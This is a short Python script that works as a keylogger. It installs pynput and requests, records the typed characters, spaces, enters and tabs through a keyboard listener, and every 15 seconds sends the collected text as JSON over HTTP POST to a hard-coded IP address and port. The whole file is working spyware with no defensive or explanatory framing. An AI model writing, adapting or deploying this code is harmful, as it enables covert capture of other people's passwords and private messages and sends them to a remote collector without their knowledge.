import subprocess

def install_required_modules():
    try:
        # Install required modules using pip
        subprocess.run(["pip", "install", "pynput", "requests"], shell=True)
    except Exception as e:
        print(f"Couldn't install required modules: {str(e)}")

# Check and install required modules
install_required_modules()

from pynput import keyboard # type: ignore
import requests # type: ignore
import json
import threading
import string

text = ""
ip_address = "192.168.1.7"  # Replace with the actual IP address
port_number = "8080"
time_interval = 15

def send_post_req():
    try:
        # Convert the keyboard data to JSON
        payload = json.dumps({"keyboardData": text})
        url = f"http://{ip_address}:{port_number}"
        
        # Explicitly specify the POST method
        r = requests.post(url, data=payload, headers={"Content-Type": "application/json"})
        
        # Setting up a timer function to run every <time_interval> specified seconds.
        timer = threading.Timer(time_interval, send_post_req)
        # Start the timer thread.
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request: {str(e)}")

def on_press(key):
    global text

    try:
        # Get the alphanumeric and punctuation keys
        key_char = key.char
        if key_char.isalnum() or key_char in string.punctuation:
            text += key_char

    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"

with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
